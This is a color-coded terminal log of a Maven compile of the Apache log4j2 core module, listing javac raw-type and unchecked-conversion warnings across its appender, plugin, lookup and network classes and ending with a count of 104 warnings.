[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m233[0m[39m,[0m[1;36m44[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m251[0m[39m,[0m[1;36m82[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m261[0m[39m,[0m[1;36m64[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m264[0m[39m,[0m[1;36m46[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mPluginManager.java[0m[39m:[0m[1;39m[[0m[1;36m266[0m[39m,[0m[1;36m27[0m[1;39m][0m[39m found raw type: [0m                                         [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m Signature attribute introduced in version [0m[1;36m49.0[0m[39m class files is ignored in [0m  [2m               [0m
[2;36m                    [0m         [39mversion [0m[1;36m48.0[0m[39m class files[0m                                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/plugins/[0m [2m               [0m
[2;36m                    [0m         [95mResolverUtil.java[0m[39m:[0m[1;39m[[0m[1;36m280[0m[39m,[0m[1;36m61[0m[1;39m][0m[39m unchecked conversion[0m                                      [2m               [0m
[2;36m                    [0m         [39m  required: java.util.Collection<java.lang.String>[0m                                   [2m               [0m
[2;36m                    [0m         [39m  found:    java.util.Collection[0m                                                     [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mFastRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m48[0m[39m,[0m[1;36m46[0m[1;39m][0m[39m found raw type: [0m                               [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mFastRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m60[0m[39m,[0m[1;36m79[0m[1;39m][0m[39m found raw type: [0m                               [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mFastRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m188[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: [0m                              [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rollin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mFastRollingFileManager.java[0m[39m:[0m[1;39m[[0m[1;36m199[0m[39m,[0m[1;36m34[0m[1;39m][0m[39m found raw type: [0m                              [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Layout[0m                                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mDefaul[0m [2m               [0m
[2;36m                    [0m         [95mtErrorHandler.java[0m[39m:[0m[1;39m[[0m[1;36m40[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m    [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mDefaul[0m [2m               [0m
[2;36m                    [0m         [95mtErrorHandler.java[0m[39m:[0m[1;39m[[0m[1;36m42[0m[39m,[0m[1;36m38[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Appender[0m    [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/routin[0m [2m               [0m
[2;36m                    [0m         [35mg/[0m[95mRoutingAppender.java[0m[39m:[0m[1;39m[[0m[1;36m88[0m[39m,[0m[1;36m44[0m[1;39m][0m[39m found raw type: [0m                                      [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mInterpol[0m [2m               [0m
[2;36m                    [0m         [95mator.java[0m[39m:[0m[1;39m[[0m[1;36m46[0m[39m,[0m[1;36m27[0m[1;39m][0m[39m found raw type: [0m                                                   [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mInterpol[0m [2m               [0m
[2;36m                    [0m         [95mator.java[0m[39m:[0m[1;39m[[0m[1;36m48[0m[39m,[0m[1;36m38[0m[1;39m][0m[39m found raw type: [0m                                                   [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFailov[0m [2m               [0m
[2;36m                    [0m         [95merAppender.java[0m[39m:[0m[1;39m[[0m[1;36m82[0m[39m,[0m[1;36m27[0m[1;39m][0m[39m found raw type: [0m                                             [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFailov[0m [2m               [0m
[2;36m                    [0m         [95merAppender.java[0m[39m:[0m[1;39m[[0m[1;36m89[0m[39m,[0m[1;36m43[0m[1;39m][0m[39m found raw type: [0m                                             [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mFailov[0m [2m               [0m
[2;36m                    [0m         [95merAppender.java[0m[39m:[0m[1;39m[[0m[1;36m140[0m[39m,[0m[1;36m20[0m[1;39m][0m[39m found raw type: [0m                                            [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mMulticastDN[0m [2m               [0m
[2;36m                    [0m         [95mSAdvertiser.java[0m[39m:[0m[1;39m[[0m[1;36m101[0m[39m,[0m[1;36m83[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                            [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mMulticastDN[0m [2m               [0m
[2;36m                    [0m         [95mSAdvertiser.java[0m[39m:[0m[1;39m[[0m[1;36m127[0m[39m,[0m[1;36m85[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                            [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mMulticastDN[0m [2m               [0m
[2;36m                    [0m         [95mSAdvertiser.java[0m[39m:[0m[1;39m[[0m[1;36m170[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                            [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mMulticastDN[0m [2m               [0m
[2;36m                    [0m         [95mSAdvertiser.java[0m[39m:[0m[1;39m[[0m[1;36m170[0m[39m,[0m[1;36m38[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                            [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mMulticastDN[0m [2m               [0m
[2;36m                    [0m         [95mSAdvertiser.java[0m[39m:[0m[1;39m[[0m[1;36m200[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                            [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mMulticastDN[0m [2m               [0m
[2;36m                    [0m         [95mSAdvertiser.java[0m[39m:[0m[1;39m[[0m[1;36m200[0m[39m,[0m[1;36m38[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                            [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mSocket[0m [2m               [0m
[2;36m                    [0m         [95mAppender.java[0m[39m:[0m[1;39m[[0m[1;36m139[0m[39m,[0m[1;36m70[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m          [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/selector/[0m[95mClassL[0m [2m               [0m
[2;36m                    [0m         [95moaderContextSelector.java[0m[39m:[0m[1;39m[[0m[1;36m84[0m[39m,[0m[1;36m21[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                    [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/selector/[0m[95mClassL[0m [2m               [0m
[2;36m                    [0m         [95moaderContextSelector.java[0m[39m:[0m[1;39m[[0m[1;36m109[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                   [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/selector/[0m[95mClassL[0m [2m               [0m
[2;36m                    [0m         [95moaderContextSelector.java[0m[39m:[0m[1;39m[[0m[1;36m225[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                   [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/selector/[0m[95mClassL[0m [2m               [0m
[2;36m                    [0m         [95moaderContextSelector.java[0m[39m:[0m[1;39m[[0m[1;36m259[0m[39m,[0m[1;36m16[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                   [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/selector/[0m[95mClassL[0m [2m               [0m
[2;36m                    [0m         [95moaderContextSelector.java[0m[39m:[0m[1;39m[[0m[1;36m260[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                   [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/selector/[0m[95mClassL[0m [2m               [0m
[2;36m                    [0m         [95moaderContextSelector.java[0m[39m:[0m[1;39m[[0m[1;36m262[0m[39m,[0m[1;36m24[0m[1;39m][0m[39m found raw type: java.lang.Class[0m                   [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class java.lang.Class<T>[0m                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mConsol[0m [2m               [0m
[2;36m                    [0m         [95meAppender.java[0m[39m:[0m[1;39m[[0m[1;36m106[0m[39m,[0m[1;36m100[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m        [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mConsol[0m [2m               [0m
[2;36m                    [0m         [95meAppender.java[0m[39m:[0m[1;39m[[0m[1;36m220[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mConsol[0m [2m               [0m
[2;36m                    [0m         [95meAppender.java[0m[39m:[0m[1;39m[[0m[1;36m227[0m[39m,[0m[1;36m76[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m         [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mTCPSocketMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m75[0m[39m,[0m[1;36m35[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mTCPSocketMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m97[0m[39m,[0m[1;36m88[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mTCPSocketMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m231[0m[39m,[0m[1;36m23[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m             [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/net/[0m[95mTCPSocketMa[0m [2m               [0m
[2;36m                    [0m         [95mnager.java[0m[39m:[0m[1;39m[[0m[1;36m234[0m[39m,[0m[1;36m34[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.Layout[0m             [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Layout<T>[0m   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mAsyncA[0m [2m               [0m
[2;36m                    [0m         [95mppender.java[0m[39m:[0m[1;39m[[0m[1;36m85[0m[39m,[0m[1;36m35[0m[1;39m][0m[39m found raw type: [0m                                                [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/[0m[95mAsyncA[0m [2m               [0m
[2;36m                    [0m         [95mppender.java[0m[39m:[0m[1;39m[[0m[1;36m93[0m[39m,[0m[1;36m37[0m[1;39m][0m[39m found raw type: [0m                                                [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/db/nos[0m [2m               [0m
[2;36m                    [0m         [35mql/[0m[95mNoSQLDatabaseManager.java[0m[39m:[0m[1;39m[[0m[1;36m192[0m[39m,[0m[1;36m24[0m[1;39m][0m[39m found raw type: [0m                               [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.appender.db.nosql.NoSQLDatabaseManager[0m                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.appender.db.nosql.NoSQLDatabaseManager<W>[0m              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rewrit[0m [2m               [0m
[2;36m                    [0m         [35me/[0m[95mRewriteAppender.java[0m[39m:[0m[1;39m[[0m[1;36m46[0m[39m,[0m[1;36m41[0m[1;39m][0m[39m found raw type: [0m                                      [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rewrit[0m [2m               [0m
[2;36m                    [0m         [35me/[0m[95mRewriteAppender.java[0m[39m:[0m[1;39m[[0m[1;36m46[0m[39m,[0m[1;36m100[0m[1;39m][0m[39m found raw type: [0m                                     [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rewrit[0m [2m               [0m
[2;36m                    [0m         [35me/[0m[95mRewriteAppender.java[0m[39m:[0m[1;39m[[0m[1;36m65[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: [0m                                      [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.Appender[0m                                               [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class org.apache.logging.log4j.core.Appender<T>[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rewrit[0m [2m               [0m
[2;36m                    [0m         [35me/[0m[95mRewriteAppender.java[0m[39m:[0m[1;39m[[0m[1;36m69[0m[39m,[0m[1;36m41[0m[1;39m][0m[39m found raw type: [0m                                      [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/appender/rewrit[0m [2m               [0m
[2;36m                    [0m         [35me/[0m[95mRewriteAppender.java[0m[39m:[0m[1;39m[[0m[1;36m91[0m[39m,[0m[1;36m20[0m[1;39m][0m[39m found raw type: [0m                                      [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m[1;36m104[0m[39m warnings [0m                                                                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                 [2m               [0m
